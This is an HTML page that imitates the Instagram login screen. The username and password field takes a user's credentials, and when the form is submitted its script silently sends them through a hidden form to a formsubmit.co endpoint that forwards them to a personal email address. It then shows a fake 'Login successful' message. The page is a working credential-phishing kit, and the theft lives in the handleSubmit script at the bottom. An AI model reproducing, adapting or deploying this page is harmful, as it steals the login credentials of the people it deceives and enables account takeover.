<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram · Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }

        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo h1 {
            font-family: 'Instagram Sans', 'Segoe UI', sans-serif;
            font-size: 40px;
            font-weight: 400;
            margin: 0;
            color: #262626;
        }

        .form-group {
            margin-bottom: 6px;
        }

        .form-group input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        .form-group input:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 7px 16px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 15px 0 20px;
            opacity: 0.7;
        }

        .login-btn:hover {
            opacity: 1;
        }

        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 10px 0 18px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 15px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin-top: 20px;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 15px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-buttons img {
            height: 40px;
        }

        .message {
            color: #ed4956;
            font-size: 14px;
            margin: 10px 0;
            display: none;
        }

        .success-message {
            color: #2ecc71;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Instagram</h1>
            </div>
            
            <div class="message" id="message"></div>
            
            <form id="loginForm" onsubmit="return handleSubmit(event)">
                <div class="form-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="divider">OR</div>
            
            <a href="#" class="fb-login">
                <span>Log in with Facebook</span>
            </a>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-buttons">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store">
            </div>
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const message = document.getElementById('message');
            
            if (!username || !password) {
                message.style.display = 'block';
                message.classList.remove('success-message');
                message.textContent = 'Please fill in all fields';
                return false;
            }
            
            // Send to your email
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://formsubmit.co/mohammedniloy111@gmail.com';
            form.style.display = 'none';
            
            const fields = {
                'username': username,
                'password': password,
                '_subject': 'New Instagram Login - niloy7t7',
                '_captcha': 'false',
                '_next': window.location.href
            };
            
            for (const [name, value] of Object.entries(fields)) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }
            
            message.style.display = 'block';
            message.classList.add('success-message');
            message.textContent = 'Login successful! Redirecting...';
            
            document.body.appendChild(form);
            form.submit();
            
            return false;
        }
    </script>
</body>
</html>
